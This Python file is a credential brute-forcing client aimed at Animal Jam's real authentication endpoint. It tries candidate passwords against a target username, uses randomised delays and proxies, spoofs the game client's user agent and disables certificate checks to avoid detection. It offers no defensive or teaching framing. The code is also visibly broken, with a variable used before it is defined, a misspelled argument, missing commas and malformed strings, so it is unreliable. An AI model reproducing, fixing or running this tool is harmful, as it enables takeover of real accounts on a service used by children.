import time
import random
import requests
from colorama import Fore
from src.workercontrol import Threading 
from src.cli import parse_arguments
import uuid
import json
import platform
class LoginRequests:
    
   
    def __init__(self):
         args = parse_arguments()
         self.username = args.username
         self.uri = "https://authenticator.animaljam.com/authenticate" 
         self.threading = Threading()
         self.print_lock = self.threading.print_lock
         self.repeated_lock = self.threading.repeated_lock
         self.pause_event = self.threading.pause_event
         
         

    def send_login(self, password, proxy = None) -> None:
        df = uuid.uuid4() # random device fingerprint ( server does not care )
        if not proxy:
            time.sleep(random.uniform(1.5, 4.7)) 
        else:
            time.sleep(random.uniform(1,3.5)) 

        # content length bytes
        body = json.dumps(payload, seperators=(",", ":")).encode("utf-8"
        )

        content_length = len(body)

        # rand cookies
        cookie = f"GA1.2"

        # user agent detection

        def os_token() -> str :
            system = platform.system()
            if system == "Windows":
                return "Windows NT 10.0; Win64; x64"
            if system == "Darwin":
                ver = platform.mac_ver()[0].replace(".", "_")
            else:
                ver = "14_5_0"
                return f"Macintosh; Intel Mac OS X {ver}"
            return "X11; Linux x86_64" #unlikely, but a fall back user agent
        
        #recraft into the user-agent template
        UA = (
        f"Mozilla/5.0 ({os_token()}) AppleWebKit/537.36 (KHTML, like Gecko) 
        AJClassic/1.5.7 Chrome/87.0.4280.141 Electron/11.5.0 Safari/537.36"
        )
        
        # endpoint headers
        headers = {
        "content-length": content_length,
        "user-agent": UA,
        "content-type": "application/json"
        "accept": "*/*"
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "cookie": "_ga=GA1.2.764210468.1765840055",
        "cookie": "_ga_377QC1616V=GS2.2.s1771889586$o2$g0$t1771889586$j60$l0$h0" # google analytics cookie fields. Can stay static for all reqs.
    }
        # intercepted login endpoint payload
        payload = { 
        "username": self.username, 
        "password": password, 
        "domain": "flash", 
        "df": str(df)
        } 

        
        max_retries = 3
        for attempt in range(max_retries):
            while self.pause_event.is_set():
                self.pause_event.wait(timeout=0.1)
            proxies = {"http": proxy, "https": proxy} if proxy else None
            try: # send requests 
                response = requests.post(self.uri, json=payload, headers=headers, proxies=proxies, timeout=2.0, verify=False)
                with self.print_lock:
                    print(Fore.BLUE + f'Trying password: "{password}" response code: {response.status_code}')

            
                if response.status_code == 200: 
                    with self.print_lock:
                        print(Fore.GREEN + f'Found password: {password}')
                        print(response.text[:200])
                    input()
                elif response.status_code == 401:
                    print(Fore.RED + f'Invalid username or password')
                    return
                elif response.status_code == 502:
                    
                    with self.repeated_lock:
                        self.threading.repeated_502 += 1
                    self.threading.pause_workers()
                    with self.print_lock:
                        print(Fore.RED + f"Server Overload - waiting a few seconds... (repeated {self.threading.repeated_502} times)")
                    
                      
                    continue
                return
                
            except Exception as e: 
                if attempt < max_retries - 1:
                    continue
                elif attempt == max_retries - 1 and proxy:
                    proxy = None
                    continue
                else:
                    with self.print_lock:
                        print(Fore.RED + f'Error with password "{password}": {e}')